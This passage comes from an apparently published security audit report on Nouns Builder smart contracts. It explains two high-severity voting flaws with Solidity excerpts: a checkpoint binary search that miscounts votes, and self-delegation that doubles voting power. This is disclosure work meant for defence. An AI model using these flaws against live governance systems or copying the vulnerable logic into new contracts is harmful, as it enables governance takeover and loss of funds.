Index</th>\n<th>Timestamp</th>\n<th>Votes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>2</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>3</td>\n<td>1</td>\n<td>2</td>\n</tr>\n<tr>\n<td>4</td>\n<td>2</td>\n<td>3</td>\n</tr>\n</tbody>\n</table>\n<p>Bob now wants to vote (via his smart contract) on a governance proposal that has been created on <code>timeCreated = 1</code> (timestamp 1).</p>\n<p>Internally, the <code>Governor._castVote</code> function determines the voter’s weight by calling <code>getVotes(_voter, proposal.timeCreated)</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275\">governance/governor/Governor.sol#L275</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_voter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timeCreated</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><code>getVotes</code> calls <code>ERC721.getPastVotes</code> internally:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462\">governance/governor/Governor.sol#L462</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_timestamp</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPastVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><code>ERC721.getPastVotes(..., 1)</code> tries to find the checkpoint within the <code>while</code> loop:</p>\n<table>\n<thead>\n<tr>\n<th># Iteration</th>\n<th><code>low</code></th>\n<th><code>middle</code></th>\n<th><code>high</code></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>2</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<p>The <code>middle</code> checkpoint with index <code>2</code> matches the given timestamp <code>1</code> and returns <code>0</code> votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.</p>\n<p><em>(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)</em></p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended mitigation steps</h3>\n<p>Consider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185#issuecomment-1258049019\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how the checkpoint math can be gamed, opening up governance to flashloan exploits, infinite voting power and overall breaking all of governance quorum and execution thresholds.</p>\n<p>Because any attacker can spam create checkpoints, to manipulate the result of the Binary Search, they can manipulate their balance to make the Governor think it’s way higher than intended.</p>\n<p>Mitigation requires ensuring that the only balance recorded for a block is the latest value (end of flashloan so the balance goes back down).</p>\n<p>Because the finding breaks accounting, allowing governance takeover, and the invariants of ERC721Votes are broken (votes are not what they are), I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-04-erc721votes-token-owners-can-double-voting-power-through-self-delegation\" style=\"position:relative;\"><a href=\"#h-04-erc721votes-token-owners-can-double-voting-power-through-self-delegation\" aria-label=\"h 04 erc721votes token owners can double voting power through self delegation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413\">[H-04] <code>ERC721Votes</code>: Token owners can double voting power through self delegation</a></h2>\n<p><em>Submitted by zkhorse, also found by berndartmueller, Ch_301, hxzy, hyh, MEP, pcarranzav, pfapostol, Picodes, and Solimander</em></p>\n<p>The owner of one or many <code>ERC721Votes</code> tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.</p>\n<h3 id=\"scenario\" style=\"position:relative;\"><a href=\"#scenario\" aria-label=\"scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenario</h3>\n<p>This exploit relies on the initial default value of the <code>delegation</code> mapping in <code>ERC721Votes</code>, which is why it will only work once per address.</p>\n<p>First, the token owner must call <code>delegate</code> or <code>delegateBySig</code>, passing their own address as the delegate:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135\"><code>ERC721Votes#delegate</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Delegates votes to an account</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _to The address delegating votes to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This calls into the internal <code>_delegate</code> function, with <code>_from</code> and <code>_to</code> both set to the token owner’s address:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190\"><code>ERC721Votes#_delegate</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev Updates delegate addresses</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _from The address delegating votes from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _to The address delegating votes to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the previous delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Store the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer voting weight from the previous delegate to the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Since this is the token owner’s first delegation, the <code>delegation</code> mapping does not contain a value for the <code>_from</code> address, and <code>prevDelegate</code> on L#181 will be set to <code>address(0)</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181\"><code>ERC721Votes.sol#L180-L181</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the previous delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p>This function then calls into <code>_moveDelegateVotes</code> to transfer voting power. This time, <code>_from</code> is <code>prevDelegate</code>, equal to <code>address(0)</code>; <code>_to</code> is the token owner’s address; and <code>_amount</code> is <code>balanceOf(_from)</code>, the token owner’s current balance:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235\"><code>ERC721Votes#_moveDelegateVotes</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk3\">/// @dev Transfers voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _from The address delegating votes from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _to The address delegating votes to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _amount The number of votes delegating</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If voting weight is being transferred:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token mint:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Get the sender&#39;s number of checkpoints</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numCheckpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Used to store the sender&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// If this isn&#39;t the sender&#39;s first checkpoint: Get their previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Update their voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token burn:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Get the recipients&#39;s number of checkpoints</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numCheckpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Used to store the recipient&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// If this isn&#39;t the recipient&#39;s first checkpoint: Get their previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Update their voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The <code>if</code> condition on L#203 is <code>true</code>, since <code>_from</code> is <code>address(0)</code>, <code>_to</code> is the owner address, and <code>_amount</code> is nonzero:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203\"><code>ERC721Votes.sol#L202-L203</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If voting weight is being transferred:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>Execution skips the <code>if</code> block on L#205-217, since <code>_from</code> is <code>address(0)</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217\"><code>ERC721Votes.sol#L205-L217</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token mint:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Get the sender&#39;s number of checkpoints</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numCheckpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Used to store the sender&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// If this isn&#39;t the sender&#39;s first checkpoint: Get their previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Update their voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span></code></pre>\n<p>However, the <code>if</code> block on L#220-232 will execute and increase the voting power allocated to <code>_to</code>:</p>\n<p><a 